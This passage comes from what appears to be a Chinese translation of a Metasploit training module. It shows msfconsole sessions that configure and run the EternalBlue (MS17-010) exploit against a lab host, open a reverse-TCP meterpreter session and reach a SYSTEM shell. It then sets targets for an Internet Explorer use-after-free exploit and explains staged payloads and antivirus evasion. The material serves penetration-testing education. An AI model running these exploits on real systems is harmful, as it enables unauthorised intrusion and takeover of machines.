ETERNALSYNERGY</span><br><span class="line">  ETERNALROMANCE</span><br><span class="line">  ETERNALCHAMPION</span><br><span class="line">  ETERNALBLUE</span><br></pre></td></tr></table></figure><p>在我们对所选模块适合我们的目的感到满意之后，我们需要设置一些规范来自定义模块以成功地针对我们的目标主机使用它，例如设置目标（或<code>RHOST</code>）<code>RHOSTS</code>。</p><h4 id="MSF-目标规范"><a href="#MSF-目标规范" class="headerlink" title="MSF - 目标规范"></a>MSF - 目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>此外，还有一个选项<code>setg</code>，它指定我们选择的选项在程序重新启动之前是永久的。因此，如果我们在特定的目标主机上工作，我们可以使用此命令设置 IP 地址一次，并且在我们将焦点转移到不同的 IP 地址之前不再更改它。</p><h4 id="MSF-永久目标规范"><a href="#MSF-永久目标规范" class="headerlink" title="MSF - 永久目标规范"></a>MSF - 永久目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>一旦一切就绪并准备就绪，我们就可以继续发起攻击。请注意，此处未设置有效载荷，因为默认的有效载荷足以进行此演示。</p><h4 id="MSF-利用执行"><a href="#MSF-利用执行" class="headerlink" title="MSF - 利用执行"></a>MSF - 利用执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter&gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>我们现在在目标机器上有一个 shell，我们可以与它交互。</p><h4 id="MSF-目标交互"><a href="#MSF-目标交互" class="headerlink" title="MSF - 目标交互"></a>MSF - 目标交互</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>这是一个如何<code>msfconsole</code>快速提供帮助的快速而肮脏的示例，但却是该框架如何工作的一个很好的示例。只需要一个模块，没有任何<code>payload</code>选择，<code>encoding</code>或者<code>pivoting</code>在会话或作业之间。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><code>Targets</code>是从那些特定操作系统的版本中获取的唯一操作系统标识符，这些操作系统使选定的漏洞利用模块可以在该特定版本的操作系统上运行。在漏洞利用模块视图中发出的命令<code>show targets</code>将显示该特定漏洞利用的所有可用漏洞目标，而在根菜单中发出相同的命令，在任何选定的漏洞利用模块之外，将让我们知道我们需要首先选择一个漏洞利用模块。</p><h4 id="MSF-显示目标"><a href="#MSF-显示目标" class="headerlink" title="MSF - 显示目标"></a>MSF - 显示目标</h4><p> MSF - 显示目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show targets</span><br><span class="line"></span><br><span class="line">[-] No exploit module selected.</span><br></pre></td></tr></table></figure><p>当查看我们之前的漏洞利用模块时，这将是我们看到的：</p><p> MSF - 显示目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><h3 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h3><p>我们可以看到这种类型的攻击只有一种通用类型的目标集。如果我们将漏洞利用模块更改为需要更具体目标范围的东西会怎样？以下漏洞利用的目的是：</p><ul><li><code>MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability</code>.</li></ul><p>如果我们想了解更多关于这个特定模块的信息以及它背后的漏洞是干什么的，我们可以使用命令<code>info</code>。当我们不确定不同漏洞利用或辅助模块的来源或功能时，此命令可以帮助我们。请记住，审核我们的代码以获取任何工件生成或“附加功能”始终被认为是最佳实践，该<code>info</code>命令应该是我们在使用新模块时采取的首要步骤之一。通过这种方式，我们可以熟悉漏洞利用功能，同时确保为我们的客户和我们提供安全、干净的工作环境。</p><h4 id="MSF-目标选择"><a href="#MSF-目标选择" class="headerlink" title="MSF - 目标选择"></a>MSF - 目标选择</h4><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability </span><br><span class="line">     Module: exploit/windows/browser/ie_execcommand_uaf</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Good</span><br><span class="line">  Disclosed: 2012-09-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  unknown</span><br><span class="line">  eromang</span><br><span class="line">  binjo</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   IE 7 on Windows XP SP3</span><br><span class="line">  2   IE 8 on Windows XP SP3</span><br><span class="line">  3   IE 7 on Windows Vista</span><br><span class="line">  4   IE 8 on Windows Vista</span><br><span class="line">  5   IE 8 on Windows 7</span><br><span class="line">  6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  ----       ---------------  --------  -----------</span><br><span class="line">  OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">  SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">  SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">  URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a vulnerability found in Microsoft Internet </span><br><span class="line">  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object </span><br><span class="line">  gets deleted in an unexpected manner, but the same memory is reused </span><br><span class="line">  again later in the CMshtmlEd::Exec() function, leading to a </span><br><span class="line">  use-after-free condition. Please note that this vulnerability has </span><br><span class="line">  been exploited since Sep 14, 2012. Also, note that </span><br><span class="line">  presently, this module has some target dependencies for the ROP </span><br><span class="line">  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present </span><br><span class="line">  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, </span><br><span class="line">  JRE 1.6.x or below must be installed (which is often the case).</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2012-4969/</span><br><span class="line">  OSVDB (85532)</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063</span><br><span class="line">  http://technet.microsoft.com/en-us/security/advisory/2757760</span><br><span class="line">  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/</span><br></pre></td></tr></table></figure><p>查看描述，我们可以大致了解此漏洞利用将为我们完成什么。牢记这一点，我们接下来要检查哪些版本容易受到此漏洞的攻击。</p><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ie_execcommand_uaf):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br></pre></td></tr></table></figure><p>我们看到了不同版本的 Internet Explorer 和各种 Windows 版本的选项。保留选择将<code>Automatic</code>让 msfconsole 知道它需要在发起成功攻击之前对给定目标执行服务检测。</p><p>但是，如果我们知道我们的目标上运行的是什么版本，我们可以使用该<code>set target &lt;index no.&gt;</code>命令从列表中选择一个目标。</p><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6</span><br><span class="line"></span><br><span class="line">target =&gt; 6</span><br></pre></td></tr></table></figure><h3 id="目标类型"><a href="#目标类型" class="headerlink" title="目标类型"></a>目标类型</h3><p>目标类型多种多样。每个目标都可能因服务包、操作系统版本甚至语言版本而异。这完全取决于目标或漏洞利用模块中的返回地址和其他参数。</p><p>返回地址可能会有所不同，因为特定的语言包更改了地址，有不同的软件版本可用，或者地址因挂钩而移动。这完全取决于识别目标所需的返回地址类型。该地址可以是<code>jmp esp</code>，跳转到标识目标的特定寄存器，或<code>pop/pop/ret</code>. 有关返回地址主题的更多信息，请参阅<a href="https://academy.hackthebox.com/module/89/section/931">Windows x86</a>模块上基于堆栈的缓冲区溢出。利用模块代码中的注释可以帮助我们确定目标的定义。</p><p>要正确识别目标，我们需要：</p><ul><li>获取目标二进制文件的副本</li><li>使用 msfpescan 找到合适的返回地址</li></ul><p>在本模块的后面，我们将更深入地研究漏洞利用开发、有效负载生成和目标识别。</p><h2 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>Metasploit 中的A<code>Payload</code>指的是帮助漏洞利用模块（通常）将 shell 返回给攻击者的模块。有效载荷与漏洞本身一起发送，以绕过易受攻击服务的标准功能程序 ( <code>exploits job</code>)，然后在目标操作系统上运行，通常向攻击者返回反向连接并建立立足点 ( <code>payload&#39;s job</code>)。</p><p>Metasploit 框架中有三种不同类型的有效载荷模块：Singles、Stagers 和 Stages。使用三种有效载荷交互类型将被证明对渗透测试者有益。它可以提供我们执行某些类型任务所需的灵活性。有效载荷是否暂存由<code>/</code>有效载荷名称表示。</p><p>例如，<code>windows/shell_bind_tcp</code>是一个没有阶段的单个有效载荷，而<code>windows/shell/bind_tcp</code>由一个 stager ( <code>bind_tcp</code>) 和一个阶段 ( <code>shell</code>) 组成。</p><h3 id="Singles"><a href="#Singles" class="headerlink" title="Singles"></a>Singles</h3><p>有效负载<code>Single</code>包含所选任务的漏洞和整个 shellcode。内联有效载荷在设计上比同类有效载荷更稳定，因为它们包含所有内容。然而，一些漏洞利用将不支持这些有效负载的最终大小，因为它们可能会变得非常大。<code>Singles</code>是独立的有效载荷。它们是在目标系统上发送和执行的唯一对象，运行后立即得到结果。单个有效负载可以像将用户添加到目标系统或启动进程一样简单。</p><h3 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h3><p><code>Stager</code>payloads 与 Stage payloads 一起工作来执行特定的任务。一个 Stager 在攻击者机器上等待，准备在该阶段在远程主机上完成运行后与受害主机建立连接。<code>Stagers</code>通常用于在攻击者和受害者之间建立网络连接，并且设计得小巧可靠。Metasploit 将使用最好的一个，并在必要时退回到不太喜欢的那个。</p><p>Windows NX 与 NO-NX Stagers</p><ul><li>NX CPU 和 DEP 的可靠性问题</li><li>NX stagers 更大（VirtualAlloc 内存）</li><li>现在默认为 NX + Win7 兼容</li></ul><h3 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h3><p><code>Stages</code>是由 stager 的模块下载的有效负载组件。各种有效负载阶段提供没有大小限制的高级功能，例如 Meterpreter、VNC 注入等。有效载荷阶段自动使用中间阶段：</p><ul><li>一个单一的<code>recv()</code>失败与大的有效载荷</li><li>Stager 接收中间 stager</li><li>中间的 Stager 然后执行完整的下载</li><li>对 RWX 也更好</li></ul><h2 id="分阶段有效载荷"><a href="#分阶段有效载荷" class="headerlink" title="分阶段有效载荷"></a>分阶段有效载荷</h2><p>简单地说，分阶段有效载荷是一种<code>exploitation process</code>模块化且功能分离的有效载荷，有助于将其完成的不同功能隔离到不同的代码块中，每个代码块单独完成其目标，但致力于将攻击链接在一起。如果所有阶段都正常工作，这最终将授予攻击者远程访问目标机器的权限。</p><p>与任何其他有效负载一样，除了授予对目标系统的 shell 访问权限外，此有效负载的范围应尽可能紧凑和不显眼，以尽可能地帮助防病毒 () &#x2F; 入侵防御系统 () 规避<code>AV</code>。<code>IPS</code></p><p><code>Stage0</code>分段有效载荷的一部分表示通过网络发送到目标机器易受攻击的服务的初始 